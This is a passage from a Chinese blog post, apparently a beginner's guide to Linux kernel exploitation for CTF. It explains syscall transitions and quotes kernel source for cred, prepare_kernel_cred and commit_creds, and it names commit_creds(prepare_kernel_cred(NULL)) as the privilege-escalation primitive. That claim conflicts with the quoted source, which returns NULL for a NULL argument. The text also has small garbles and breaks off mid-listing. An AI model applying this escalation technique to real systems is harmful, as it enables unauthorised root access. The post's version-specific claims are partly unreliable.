<!DOCTYPE html><html lang="zh-Hans"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="kernel-pwn入门学习"><meta name="keywords" content="kernel pwn"><meta name="author" content="Alex"><meta name="copyright" content="Alex"><title>kernel-pwn入门学习 | Alex's blog~</title><link rel="shortcut icon" href="/melody-favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.9.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.9.0"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script src="https://v1.hitokoto.cn/?encode=js&amp;charset=utf-8&amp;select=.footer_custom_text" defer></script><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  hexoVersion: '5.4.0'
} </script><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="Alex's blog~" type="application/atom+xml">
</head><body><canvas class="fireworks"></canvas><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="true"><div class="toggle-sidebar-info text-center"><span data-toggle="切换文章详情">切换站点概览</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">目录</div><div class="sidebar-toc__progress"><span class="progress-notice">你已经读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-number">1.</span> <span class="toc-text">基础知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Ring-Model"><span class="toc-number">1.1.</span> <span class="toc-text">Ring Model</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E6%A0%B8%E6%A8%A1%E5%9D%97"><span class="toc-number">1.2.</span> <span class="toc-text">内核模块</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%A8%E6%88%B7%E7%A9%BA%E9%97%B4%E5%88%B0%E5%86%85%E6%A0%B8%E7%A9%BA%E9%97%B4"><span class="toc-number">1.3.</span> <span class="toc-text">用户空间到内核空间</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E6%A0%B8%E7%A9%BA%E9%97%B4%E5%88%B0%E7%94%A8%E6%88%B7%E7%A9%BA%E9%97%B4"><span class="toc-number">1.4.</span> <span class="toc-text">内核空间到用户空间</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#cred%E7%BB%93%E6%9E%84%E4%BD%93"><span class="toc-number">1.5.</span> <span class="toc-text">cred结构体</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#task-struct%E7%BB%93%E6%9E%84%E4%BD%93"><span class="toc-number">1.6.</span> <span class="toc-text">task_struct结构体</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%9D%E6%8A%A4%E6%8E%AA%E6%96%BD"><span class="toc-number">1.7.</span> <span class="toc-text">保护措施</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%A5%E9%97%A8%E9%A2%98%E7%9B%AE-%E5%BC%BA%E7%BD%91%E6%9D%AFcore"><span class="toc-number">2.</span> <span class="toc-text">入门题目 - 强网杯core</span></a></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="https://pic4.zhimg.com/80/v2-5cb1e2bdc0644f9828029a94181f4542_1440w.jpg"></div><div class="author-info__name text-center">Alex</div><div class="author-info__description text-center">pwn</div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">文章</span><span class="pull-right">60</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">标签</span><span class="pull-right">55</span></a><a class="author-info-articles__categories article-meta" href="/categories"><span class="pull-left">分类</span><span class="pull-right">1</span></a></div><hr><div class="author-info-links"><div class="author-info-links__title text-center">Links</div><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="https://n0vice.top/">N0vice</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="http://snowywar.top/">魔法少女雪殇</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="https://l0ne1y.xyz/">L0ne1y</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="http://eeeeeeeeeeeeeeeea.cn/">eeeeeeeeeeeeeeeea</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="https://giles-one.github.io/">cat03</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="https://ulrica66666.github.io/">ulrica66666</a></div></div></div><div id="content-outer"><div id="top-container" style="background-image: url(https://i.loli.net/2021/03/05/xqReclzVihJKGUu.jpg)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">Alex's blog~</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">Home</a><a class="site-page" href="/archives">文章</a><a class="site-page" href="/tags">标签</a><a class="site-page" href="/categories">分类</a></span><span class="pull-right"></span></div><div id="post-info"><div id="post-title">kernel-pwn入门学习</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2024-02-11</time></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="Ring-Model"><a href="#Ring-Model" class="headerlink" title="Ring Model"></a>Ring Model</h3><blockquote>
<p>intel CPU 将 CPU 的特权级别分为 4 个级别：Ring 0, Ring 1, Ring 2, Ring 3。</p>
<p>Ring0 只给 OS 使用，Ring 3 所有程序都可以使用，内层 Ring 可以随便使用外层 Ring 的资源。</p>
<p>使用 Ring Model 是为了提升系统安全性，例如某个间谍软件作为一个在 Ring 3 运行的用户程序，在不通知用户的时候打开摄像头会被阻止，因为访问硬件需要使用 being 驱动程序保留的 Ring 1 的方法。</p>
<p>大多数的现代操作系统只使用了 Ring 0 和 Ring 3。</p>
</blockquote>
<h3 id="内核模块"><a href="#内核模块" class="headerlink" title="内核模块"></a>内核模块</h3><p>内核模块一般有驱动程序和内核扩展模块，Linux是单内核系统，需要模块机制来进行扩展和维护，一般CTF Kernel Pwn就是挖掘模块的漏洞。</p>
<blockquote>
<p>insmod: 加载模块到内核</p>
<p>rmmod: 卸载模块</p>
<p>lsmod: 列出加载的模块</p>
<p>modprobe: 添加或删除模块</p>
</blockquote>
<h3 id="用户空间到内核空间"><a href="#用户空间到内核空间" class="headerlink" title="用户空间到内核空间"></a>用户空间到内核空间</h3><p>当发生 系统调用，产生异常，外设产生中断等事件时，会发生用户态到内核态的切换，具体的过程为：</p>
<ol>
<li>通过<code>swapgs</code>切换 GS 段寄存器，将 GS 寄存器值和一个特定位置的值进行交换，目的是保存 GS 值，同时将该位置的值作为内核执行时的 GS 值使用。</li>
<li>将当前栈顶（用户空间栈顶）记录在 CPU 独占变量区域里，将 CPU 独占区域里记录的内核栈顶放入 rsp/esp。</li>
<li>通过 push 保存各寄存器值，具体的代码如下:</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> ENTRY(entry_SYSCALL_64)</span><br><span class="line"> &#x2F;* SWAPGS_UNSAFE_STACK是一个宏，x86直接定义为swapgs指令 *&#x2F;</span><br><span class="line"> SWAPGS_UNSAFE_STACK</span><br><span class="line"></span><br><span class="line"> &#x2F;* 保存栈值，并设置内核栈 *&#x2F;</span><br><span class="line"> movq %rsp, PER_CPU_VAR(rsp_scratch)</span><br><span class="line"> movq PER_CPU_VAR(cpu_current_top_of_stack), %rsp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x2F;* 通过push保存寄存器值，形成一个pt_regs结构 *&#x2F;</span><br><span class="line">&#x2F;* Construct struct pt_regs on stack *&#x2F;</span><br><span class="line">pushq  $__USER_DS      &#x2F;* pt_regs-&gt;ss *&#x2F;</span><br><span class="line">pushq  PER_CPU_VAR(rsp_scratch)  &#x2F;* pt_regs-&gt;sp *&#x2F;</span><br><span class="line">pushq  %r11             &#x2F;* pt_regs-&gt;flags *&#x2F;</span><br><span class="line">pushq  $__USER_CS      &#x2F;* pt_regs-&gt;cs *&#x2F;</span><br><span class="line">pushq  %rcx             &#x2F;* pt_regs-&gt;ip *&#x2F;</span><br><span class="line">pushq  %rax             &#x2F;* pt_regs-&gt;orig_ax *&#x2F;</span><br><span class="line">pushq  %rdi             &#x2F;* pt_regs-&gt;di *&#x2F;</span><br><span class="line">pushq  %rsi             &#x2F;* pt_regs-&gt;si *&#x2F;</span><br><span class="line">pushq  %rdx             &#x2F;* pt_regs-&gt;dx *&#x2F;</span><br><span class="line">pushq  %rcx tuichu    &#x2F;* pt_regs-&gt;cx *&#x2F;</span><br><span class="line">pushq  $-ENOSYS        &#x2F;* pt_regs-&gt;ax *&#x2F;</span><br><span class="line">pushq  %r8              &#x2F;* pt_regs-&gt;r8 *&#x2F;</span><br><span class="line">pushq  %r9              &#x2F;* pt_regs-&gt;r9 *&#x2F;</span><br><span class="line">pushq  %r10             &#x2F;* pt_regs-&gt;r10 *&#x2F;</span><br><span class="line">pushq  %r11             &#x2F;* pt_regs-&gt;r11 *&#x2F;</span><br><span class="line">sub $(6*8), %rsp      &#x2F;* pt_regs-&gt;bp, bx, r12-15 not saved *&#x2F;</span><br></pre></td></tr></table></figure>
<ol>
<li><p>通过汇编指令判断是否为 x32_abi。</p>
</li>
<li><p>通过系统调用号，跳到全局变量 sys_call_table 相应位置继续执行系统调用。</p>
</li>
</ol>
<h3 id="内核空间到用户空间"><a href="#内核空间到用户空间" class="headerlink" title="内核空间到用户空间"></a>内核空间到用户空间</h3><p>退出时，流程如下：</p>
<ol>
<li>通过 <code>swapgs</code> 恢复 GS 值</li>
<li>通过 <code>sysretq</code> 或者 <code>iretq</code> 恢复到用户控件继续执行。如果使用 <code>iretq</code> 还需要给出用户空间的一些信息（CS, eflags/rflags, esp/rsp 等）</li>
</ol>
<h3 id="cred结构体"><a href="#cred结构体" class="headerlink" title="cred结构体"></a>cred结构体</h3><p>每个进程中都有一个 cred 结构，这个结构保存了该进程的权限等信息（uid，gid 等），如果能修改某个进程的 cred，那么也就修改了这个进程的权限。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> &#123;</span></span><br><span class="line">    <span class="keyword">atomic_t</span>    usage;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line">    <span class="keyword">atomic_t</span>    subscribers;    <span class="comment">/* number of processes subscribed */</span></span><br><span class="line">    <span class="keyword">void</span>        *put_addr;</span><br><span class="line">    <span class="keyword">unsigned</span>    magic;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_MAGIC  0x43736564</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_MAGIC_DEAD 0x44656144</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">kuid_t</span>      uid;        <span class="comment">/* real UID of the task */</span></span><br><span class="line">    <span class="keyword">kgid_t</span>      gid;        <span class="comment">/* real GID of the task */</span></span><br><span class="line">    <span class="keyword">kuid_t</span>      suid;       <span class="comment">/* saved UID of the task */</span></span><br><span class="line">    <span class="keyword">kgid_t</span>      sgid;       <span class="comment">/* saved GID of the task */</span></span><br><span class="line">    <span class="keyword">kuid_t</span>      euid;       <span class="comment">/* effective UID of the task */</span></span><br><span class="line">    <span class="keyword">kgid_t</span>      egid;       <span class="comment">/* effective GID of the task */</span></span><br><span class="line">    <span class="keyword">kuid_t</span>      fsuid;      <span class="comment">/* UID for VFS ops */</span></span><br><span class="line">    <span class="keyword">kgid_t</span>      fsgid;      <span class="comment">/* GID for VFS ops */</span></span><br><span class="line">    <span class="keyword">unsigned</span>    securebits; <span class="comment">/* SUID-less security management */</span></span><br><span class="line">    <span class="keyword">kernel_cap_t</span>    cap_inheritable; <span class="comment">/* caps our children can inherit */</span></span><br><span class="line">    <span class="keyword">kernel_cap_t</span>    cap_permitted;  <span class="comment">/* caps we&#x27;re permitted */</span></span><br><span class="line">    <span class="keyword">kernel_cap_t</span>    cap_effective;  <span class="comment">/* caps we can actually use */</span></span><br><span class="line">    <span class="keyword">kernel_cap_t</span>    cap_bset;   <span class="comment">/* capability bounding set */</span></span><br><span class="line">    <span class="keyword">kernel_cap_t</span>    cap_ambient;    <span class="comment">/* Ambient capability set */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span>   jit_keyring;    <span class="comment">/* default keyring to attach requested</span></span><br><span class="line"><span class="comment">                     * keys to */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span> __<span class="title">rcu</span> *<span class="title">session_keyring</span>;</span> <span class="comment">/* keyring inherited over fork */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span>  *<span class="title">process_keyring</span>;</span> <span class="comment">/* keyring private to this process */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span>  *<span class="title">thread_keyring</span>;</span> <span class="comment">/* keyring private to this thread */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span>  *<span class="title">request_key_auth</span>;</span> <span class="comment">/* assumed request_key authority */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line">    <span class="keyword">void</span>        *security;  <span class="comment">/* subjective LSM security */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span>;</span>   <span class="comment">/* real user ID subscription */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_namespace</span> *<span class="title">user_ns</span>;</span> <span class="comment">/* user_ns the caps and keyrings are relative to. */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">group_info</span> *<span class="title">group_info</span>;</span>  <span class="comment">/* supplementary groups for euid/fsgid */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> <span class="title">rcu</span>;</span>        <span class="comment">/* RCU deletion hook */</span></span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure>
<h3 id="task-struct结构体"><a href="#task-struct结构体" class="headerlink" title="task_struct结构体"></a>task_struct结构体</h3><p>在内核中使用结构体 <code>task_struct</code> 表示一个进程，task_struct主要有以下的成员：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">audit_context</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bio_list</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">blk_plug</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_local_storage</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_run_ctx</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">capture_control</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cfs_rq</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fs_struct</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">futex_pi_state</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_context</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_uring_task</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mempolicy</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nameidata</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nsproxy</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">perf_event_context</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pid_namespace</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rcu_node</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">reclaim_state</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">robust_list_head</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">root_domain</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rq</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sched_attr</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seq_file</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sighand_struct</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">signal_struct</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_delay_info</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_group</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_event_mm</span>;</span></span><br></pre></td></tr></table></figure>
<p>源码链接：<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/latest/source/include/linux/sched.h#L746">https://elixir.bootlin.com/linux/latest/source/include/linux/sched.h#L746</a></p>
<p>task_struct中有cred指针：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Process credentials: */</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">/* Tracer&#x27;s credentials at attach: */</span></span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>        *<span class="title">ptracer_cred</span>;</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">/* Objective and real subjective task credentials (COW): */</span></span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>        *<span class="title">real_cred</span>;</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">/* Effective (overridable) subjective task credentials (COW): */</span></span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>        *<span class="title">cred</span>;</span></span><br></pre></td></tr></table></figure>
<p>要改变一个进程的cred结构体，就能改变其执行权限，在内核空间有如下两个函数，都位于kernel/cred.c中：</p>
<ul>
<li><code>struct cred* prepare_kernel_cred(struct task_struct* daemon)</code>：该函数用以拷贝一个进程的cred结构体，并返回一个新的cred结构体，需要注意的是daemon参数应为有效的进程描述符地址或NULL，如果传入NULL，则会返回一个root权限的cred。</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * prepare_kernel_cred - Prepare a set of credentials for a kernel service</span></span><br><span class="line"><span class="comment"> * @daemon: A userspace daemon to be used as a reference</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Prepare a set of credentials for a kernel service.  This can then be used to</span></span><br><span class="line"><span class="comment"> * override a task&#x27;s own credentials so that work can be done on behalf of that</span></span><br><span class="line"><span class="comment"> * task that requires a different subjective context.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @daemon is used to provide a base cred, with the security data derived from</span></span><br><span class="line"><span class="comment"> * that; if this is &quot;&amp;init_task&quot;, they&#x27;ll be set to 0, no groups, full</span></span><br><span class="line"><span class="comment"> * capabilities, and no keys.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The caller may change these controls afterwards if desired.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Returns the new credentials or NULL if out of memory.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function">struct cred *<span class="title">prepare_kernel_cred</span><span class="params">(struct task_struct *daemon)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">old</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">new</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (WARN_ON_ONCE(!daemon))</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">new</span> = kmem_cache_alloc(cred_jar, GFP_KERNEL);</span><br><span class="line">	<span class="keyword">if</span> (!<span class="keyword">new</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	kdebug(<span class="string">&quot;prepare_kernel_cred() alloc %p&quot;</span>, <span class="keyword">new</span>);</span><br><span class="line"></span><br><span class="line">	old = get_task_cred(daemon);</span><br><span class="line"></span><br><span class="line">	*<span class="keyword">new</span> = *old;</span><br><span class="line">	<span class="keyword">new</span>-&gt;non_rcu = <span class="number">0</span>;</span><br><span class="line">	atomic_long_set(&amp;<span class="keyword">new</span>-&gt;usage, <span class="number">1</span>);</span><br><span class="line">	get_uid(<span class="keyword">new</span>-&gt;user);</span><br><span class="line">	get_user_ns(<span class="keyword">new</span>-&gt;user_ns);</span><br><span class="line">	get_group_info(<span class="keyword">new</span>-&gt;group_info);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line">	<span class="keyword">new</span>-&gt;session_keyring = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">new</span>-&gt;process_keyring = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">new</span>-&gt;thread_keyring = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">new</span>-&gt;request_key_auth = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">new</span>-&gt;jit_keyring = KEY_REQKEY_DEFL_THREAD_KEYRING;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line">	<span class="keyword">new</span>-&gt;security = <span class="literal">NULL</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	<span class="keyword">new</span>-&gt;ucounts = get_ucounts(<span class="keyword">new</span>-&gt;ucounts);</span><br><span class="line">	<span class="keyword">if</span> (!<span class="keyword">new</span>-&gt;ucounts)</span><br><span class="line">		<span class="keyword">goto</span> error;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (security_prepare_creds(<span class="keyword">new</span>, old, GFP_KERNEL_ACCOUNT) &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">goto</span> error;</span><br><span class="line"></span><br><span class="line">	put_cred(old);</span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">new</span>;</span><br><span class="line"></span><br><span class="line">error:</span><br><span class="line">	put_cred(<span class="keyword">new</span>);</span><br><span class="line">	put_cred(old);</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(prepare_kernel_cred);</span><br></pre></td></tr></table></figure>
<ul>
<li><code>int commit_creds(struct cred *new)</code>：该函数用以将一个新的cred结构体应用到进程。内核态就需要调用<code>commit_creds(prepare_kernel_cred(NULL))</code>即可达成提权功能。</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * commit_creds - Install new credentials upon the current task</span></span><br><span class="line"><span class="comment"> * @new: The credentials to be assigned</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Install a new set of credentials to the current task, using RCU to replace</span></span><br><span class="line"><span class="comment"> * the old set.  Both the objective and the subjective credentials pointers are</span></span><br><span class="line"><span class="comment"> * updated.  This function may not be called if the subjective credentials are</span></span><br><span class="line"><span class="comment"> * in an overridden state.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * This function eats the caller&#x27;s reference to the new credentials.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Always returns 0 thus allowing this function to be tail-called at the end</span></span><br><span class="line"><span class="comment"> * of, say, sys_setgid().</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">commit_creds</span><span class="params">(struct cred *<span class="keyword">new</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">task</span> =</span> current;</span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">old</span> =</span> task-&gt;real_cred;</span><br><span class="line"></span><br><span class="line">	kdebug(<span class="string">&quot;commit_creds(%p&#123;%ld&#125;)&quot;</span>, <span class="keyword">new</span>,</span><br><span class="line">	       atomic_long_read(&amp;<span class="keyword">new</span>-&gt;usage));</span><br><span class="line"></span><br><span class="line">	BUG_ON(task-&gt;cred != old);</span><br><span class="line">	BUG_ON(atomic_long_read(&amp;<span class="keyword">new</span>-&gt;usage) &lt; <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">	get_cred(<span class="keyword">new</span>); <span class="comment">/* we will require a ref for the subj creds too */</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* dumpability changes */</span></span><br><span class="line">	<span class="keyword">if</span> (!uid_eq(old-&gt;euid, <span class="keyword">new</span>-&gt;euid) ||</span><br><span class="line">	    !gid_eq(old-&gt;egid, <span class="keyword">new</span>-&gt;egid) ||</span><br><span class="line">	    !uid_eq(old-&gt;fsuid, <span class="keyword">new</span>-&gt;fsuid) ||</span><br><span class="line">	    !gid_eq(old-&gt;fsgid, <span class="keyword">new</span>-&gt;fsgid) ||</span><br><span class="line">	    !cred_cap_issubset(old, <span class="keyword">new</span>)) &#123;</span><br><span class="line">		<span class="keyword">if</span> (task-&gt;mm)</span><br><span class="line">			set_dumpable(task-&gt;mm, suid_dumpable);</span><br><span class="line">		task-&gt;pdeath_signal = <span class="number">0</span>;</span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * If a task drops privileges and becomes nondumpable,</span></span><br><span class="line"><span class="comment">		 * the dumpability change must become visible before</span></span><br><span class="line"><span class="comment">		 * the credential change; otherwise, a __ptrace_may_access()</span></span><br><span class="line"><span class="comment">		 * racing with this change may be able to attach to a task it</span></span><br><span class="line"><span class="comment">		 * shouldn&#x27;t be able to attach to (as if the task had dropped</span></span><br><span class="line"><span class="comment">		 * privileges without becoming nondumpable).</span></span><br><span class="line"><span class="comment">		 * Pairs with a read barrier in __ptrace_may_access().</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		smp_wmb();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* alter the thread keyring */</span></span><br><span class="line">	<span class="keyword">if</span> (!uid_eq(<span class="keyword">new</span>-&gt;fsuid, old-&gt;fsuid))</span><br><span class="line">		key_fsuid_changed(<span class="keyword">new</span>);</span><br><span class="line">	<span class="keyword">if</span> (!gid_eq(<span class="keyword">new</span>-&gt;fsgid, old-&gt;fsgid))</span><br><span class="line">		key_fsgid_changed(<span class="keyword">new</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* do it</span></span><br><span class="line"><span class="comment">	 * RLIMIT_NPROC limits on user-&gt;processes have already been checked</span></span><br><span class="line"><span class="comment">	 * in set_user().</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (<span class="keyword">new</span>-&gt;user != old-&gt;user || <span class="keyword">new</span>-&gt;user_ns != old-&gt;user_ns)</span><br><span class="line">		inc_rlimit_ucounts(<span class="keyword">new</span>-&gt;ucounts, UCOUNT_RLIMIT_NPROC, <span class="number">1</span>);</span><br><span class="line">	rcu_assign_pointer(task-&gt;real_cred, <span class="keyword">new</span>);</span><br><span class="line">	rcu_assign_pointer(task-&gt;cred, <span class="keyword">new</span>);</span><br><span class="line">	<span class="keyword">if</span> (<span class="keyword">new</span>-&gt;user != old-&gt;user || <span class="keyword">new</span>-&gt;user_ns != old-&gt;user_ns)</span><br><span class="line">		dec_rlimit_ucounts(old-&gt;ucounts, UCOUNT_RLIMIT_NPROC, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* send notifications */</span></span><br><span class="line">	<span class="keyword">if</span> (!uid_eq(<span class="keyword">new</span>-&gt;uid,   old-&gt;uid)  ||</span><br><span class="line">	    !uid_eq(<span class="keyword">new</span>-&gt;euid,  old-&gt;euid) ||</span><br><span class="line">	    !uid_eq(<span class="keyword">new</span>-&gt;suid,  old-&gt;suid) ||</span><br><span class="line">	    !uid_eq(<span 